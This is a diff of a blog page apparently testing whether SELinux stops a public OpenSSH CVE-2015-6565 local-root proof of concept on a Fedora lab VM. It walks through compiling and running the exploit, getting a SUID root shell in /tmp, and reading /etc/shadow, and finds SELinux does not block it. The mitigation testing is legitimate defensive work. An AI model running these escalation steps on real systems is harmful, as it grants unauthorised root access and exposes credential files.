@@ -25,7 +25,7 @@
                     <span class="li-menu-icon" onclick="javascript:toggle('menu');">&#9776;</span>
                     <ul id="menu2" class="li-menu-items">
                         
-                            <li><a href="https://jsoss-sig.github.io/about/"> about SOSS </a></li>
+                            <li><a href="https://jsoss-sig.github.io/about/about/"> about SOSS </a></li>
                         
                             <li><a href="https://jsoss-sig.github.io/post/"> Blog </a></li>
                         
@@ -37,7 +37,7 @@
             <div class="sixteen columns">
                 <ul id="menu" class="li-menu-items li-menu-mobile">
                     
-                        <li><a href="https://jsoss-sig.github.io/about/"> about SOSS </a></li>
+                        <li><a href="https://jsoss-sig.github.io/about/about/"> about SOSS </a></li>
                     
                         <li><a href="https://jsoss-sig.github.io/post/"> Blog </a></li>
                     
@@ -71,7 +71,9 @@
 
 <p>We found there was information about PoC to get local priveledge with
 CVE-2015-6565(vulnerability for OpenSSH), then we want to make sure can we
-protect it by using SELinux or not. (written by Kazuki Omo: ka-omo@sios.com)</p>
+protect it by using SELinux or not.</p>
+
+<p>(Written by Kazuki Omo:ka-omo@sios.com).</p>
 
 <hr />
 
@@ -92,9 +94,9 @@ to that guest.</strong></p>
 <p>The openssh version is 6.8p1-5 ;</p>
 
 <pre><code>    [root@localhost ~]# rpm -qa|grep -i openssh
-openssh-6.8p1-5.fc22.x86_64
-openssh-server-6.8p1-5.fc22.x86_64
-openssh-clients-6.8p1-5.fc22.x86_64
+    openssh-6.8p1-5.fc22.x86_64
+    openssh-server-6.8p1-5.fc22.x86_64
+    openssh-clients-6.8p1-5.fc22.x86_64
 </code></pre>
 
 <ol>
@@ -102,7 +104,7 @@ openssh-clients-6.8p1-5.fc22.x86_64
 
 <li><p>Compile that code on PoC Fedora22;</p>
 
-<pre><code>[sios@localhost ~]$  gcc not_an_sshnuke.c -o not_an_sshnuke
+<pre><code>[jsossug@localhost ~]$  gcc not_an_sshnuke.c -o not_an_sshnuke
 </code></pre></li>
 </ol>
 
@@ -115,88 +117,73 @@ openssh-clients-6.8p1-5.fc22.x86_64
 <ol>
 <li><p>Run the code with normal user account;</p>
 
-<pre><code>[sios@localhost ~]$ ./not_an_sshnuke /dev/pts/3
+<pre><code>[jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
 </code></pre></li>
 
 <li><p>Run the code with normal user account;</p>
 
-<pre><code>[sios@localhost ~]$ ./not_an_sshnuke /dev/pts/3
-
+<pre><code>[jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
 [*] Waiting for slave device /dev/pts/3
-</code></pre>
-</li>
+</code></pre></li>
 
 <li><p>Open 2 terminals and ssh to the PoC machine in each terminal with normal user account;</p>
 
-<pre><code>[sios@extest ~]$ ssh -l sios 172.16.148.139
-
-sios@172.16.148.139&rsquo;s password:
+<pre><code>[jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
+jsossug@172.16.148.139's password: 
 Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
-[sios@localhost ~]$
-</code></pre>
+[jsossug@localhost ~]$ 
 
-<pre><code>[sios@extest ~]$ ssh -l sios 172.16.148.139
 
-sios@172.16.148.139&rsquo;s password:
+[jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
+jsossug@172.16.148.139's password: 
 Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
-[sios@localhost ~]$
-</code></pre>
-</li>
+[jsossug@localhost ~]$ 
+</code></pre></li>
 
 <li><p>Open another terminal and ssh to the PoC machine with <strong>root</strong> account. If ;</p>
 
-<pre><code>[sios@extest ~]$ ssh -l root 172.16.148.139
-
-root@172.16.148.139&rsquo;s password:
+<pre><code>[jsossug@extest ~]$ ssh -l root 172.16.148.139
+root@172.16.148.139's password: 
 Last login: Sun Jan 29 14:06:37 2017 from 172.16.148.1
-[root@localhost ~]#
-</code></pre>
-</li>
+[root@localhost ~]# 
+</code></pre></li>
 
 <li><p>On the first terminal, you can see following results;</p>
 
-<pre><code>[sios@localhost src]$ ./not_an_sshnuke /dev/pts/3
-
+<pre><code>[jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
 [*] Waiting for slave device /dev/pts/3
 [+] Got PTY slave /dev/pts/3
 [+] Making PTY slave the controlling terminal
 [+] SUID shell at /tmp/sh
-</code></pre>
-</li>
+</code></pre></li>
 
 <li><p>Just want to make sure /tmp/sh attribute;</p>
 
 <pre><code>[root@localhost ~]# ls -lZ /tmp/sh
-
 -rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:31 /tmp/sh
-</code></pre>
-</li>
+</code></pre></li>
 
 <li><p>Then run /tmp/sh on first terminal with following option;</p>
 
-<pre><code>[sios@localhost src]$ /tmp/sh --norc --noprofile -p
+<pre><code>[jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
 </code></pre></li>
 
 <li><p>Now we got &ldquo;euid=0&rdquo;;</p>
 
 <pre><code>sh-4.3# id
-
-uid=1000(sios) gid=1000(sios) euid=0(root) groups=1000(sios),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 sh-4.3# cat /etc/shadow
-bin:<em>:16489:0:99999:7:::
-daemon:</em>:16489:0:99999:7:::
-adm:<em>:16489:0:99999:7:::
-lp:</em>:16489:0:99999:7:::
-</code></pre>
-</li>
+bin:*:16489:0:99999:7:::
+daemon:*:16489:0:99999:7:::
+adm:*:16489:0:99999:7:::
+lp:*:16489:0:99999:7:::
+</code></pre></li>
 
 <li><p>SELinux is &ldquo;Enabled&rdquo;;</p>
 
 <pre><code>sh-4.3# getenforce
-
 Enforcing
-</code></pre>
-</li>
+</code></pre></li>
 </ol>
 
 <hr />
@@ -210,9 +197,9 @@ tihs vulnerability.</p>
 
 <ol>
 <li><p>Update SELinux Policy;</p>
-<pre><code>
-[root@localhost ~]# dnf -y update selinux-policy-targeted
-Fedora 22 - x86_64 - Updates                    2.2 MB/s |  23 MB     00:10
+
+<pre><code>[root@localhost ~]# dnf -y update selinux-policy-targeted
+Fedora 22 - x86_64 - Updates                    2.2 MB/s |  23 MB     00:10    
 Last metadata expiration check performed 0:00:13 ago on Wed Feb  1 04:46:43 2017.
 Dependencies resolved.
 ================================================================================
@@ -228,79 +215,70 @@ Upgrade  2 Packages
 
 Total download size: 4.5 M
 Downloading Packages:
-(1/2): selinux-policy-3.13.1-128.28.fc22.noarch 1.6 MB/s | 428 kB     00:00
-(2/2): selinux-policy-targeted-3.13.1-128.28.fc 998 kB/s | 4.1 MB     00:04
---------------------------------------------------------------------------------Total                                           825 kB/s | 4.5 MB     00:05
+  (1/2): selinux-policy-3.13.1-128.28.fc22.noarch 1.6 MB/s | 428 kB     00:00    
+  (2/2): selinux-policy-targeted-3.13.1-128.28.fc 998 kB/s | 4.1 MB     00:04    
+--------------------------------------------------------------------------------
+Total                                           825 kB/s | 4.5 MB     00:05     
 Running transaction check
 Transaction check succeeded.
 Running transaction test
 Transaction test succeeded.
 Running transaction
-  Upgrading   : selinux-policy-3.13.1-128.28.fc22.noarch                    1/4
-  Upgrading   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           2/4
-  Cleanup     : selinux-policy-targeted-3.13.1-122.fc22.noarch              3/4
-  Cleanup     : selinux-policy-3.13.1-122.fc22.noarch                       4/4
-  Verifying   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           1/4
-  Verifying   : selinux-policy-3.13.1-128.28.fc22.noarch                    2/4
-  Verifying   : selinux-policy-3.13.1-122.fc22.noarch                       3/4
-  Verifying   : selinux-policy-targeted-3.13.1-122.fc22.noarch              4/4
+  Upgrading   : selinux-policy-3.13.1-128.28.fc22.noarch                    1/4 
+  Upgrading   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           2/4 
+  Cleanup     : selinux-policy-targeted-3.13.1-122.fc22.noarch              3/4 
+  Cleanup     : selinux-policy-3.13.1-122.fc22.noarch                       4/4 
+  Verifying   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           1/4 
+  Verifying   : selinux-policy-3.13.1-128.28.fc22.noarch                    2/4 
+  Verifying   : selinux-policy-3.13.1-122.fc22.noarch                       3/4 
+  Verifying   : selinux-policy-targeted-3.13.1-122.fc22.noarch              4/4 
 
 Upgraded:
-  selinux-policy.noarch 3.13.1-128.28.fc22
-  selinux-policy-targeted.noarch 3.13.1-128.28.fc22
+  selinux-policy.noarch 3.13.1-128.28.fc22                                      
+  selinux-policy-targeted.noarch 3.13.1-128.28.fc22                             
 
 Complete!
 [root@localhost ~]# getenforce
 Enforcing
-
-</code></pre>
-</li>
+</code></pre></li>
 
 <li><p>We continue to that PoC with updated SELinux Policy again;</p>
 
-<pre><code>[sios@localhost src]$ ./not_an_sshnuke /dev/pts/3
-
+<pre><code>[jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
 [*] Waiting for slave device /dev/pts/3
 [+] Got PTY slave /dev/pts/3
 [+] Making PTY slave the controlling terminal
 [+] SUID shell at /tmp/sh
-</code></pre>
-</li>
+</code></pre></li>
 
 <li><p>Just want to make sure /tmp/sh attribute;</p>
 
 <pre><code>[root@localhost ~]# ls -lZ /tmp/sh
-
 -rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:47 /tmp/sh
-</code></pre>
-</li>
+</code></pre></li>
 
 <li><p>Run /tmp/sh with updated SELinux Policy;</p>
 
-<pre><code>[sios@localhost src]$ /tmp/sh --norc --noprofile -p
-
+<pre><code>[jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
 sh-4.3# id
-uid=1000(sios) gid=1000(sios) euid=0(root) groups=1000(sios),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 sh-4.3# cat /etc/shadow
-bin:<em>:16489:0:99999:7:::
-daemon:</em>:16489:0:99999:7:::
-adm:<em>:16489:0:99999:7:::
-lp:</em>:16489:0:99999:7:::
+bin:*:16489:0:99999:7:::
+daemon:*:16489:0:99999:7:::
+adm:*:16489:0:99999:7:::
+lp:*:16489:0:99999:7:::
 sh-4.3# exit
 exit
-[sios@localhost src]$ getenforce
+[jsossug@localhost src]$ getenforce
 Enforcing
-</code></pre>
-</li>
+</code></pre></li>
 
 <li><p>Just we want to make sure SELinux Policy is updated;</p>
 
-<pre><code>[sios@localhost src]$ rpm -qa|grep -i selinux-policy
-
+<pre><code>[jsossug@localhost src]$ rpm -qa|grep -i selinux-policy
 selinux-policy-3.13.1-128.28.fc22.noarch
 selinux-policy-targeted-3.13.1-128.28.fc22.noarch
-</code></pre>
-</li>
+</code></pre></li>
 </ol>
 
 <p>It seems that even if we update SELinux Policy, we can&rsquo;t mitigate this
@@ -339,7 +317,8 @@ vulnerability. We will continue to check it.</p>
             <div class="eight columns">
                 <div class="li-pagination-previous">
                     
-                        &nbsp;
+                        Later article<br />
+                        <a href="https://jsoss-sig.github.io/about/prospectus/"> prospectus</a>
                     
                 </div>
             </div>
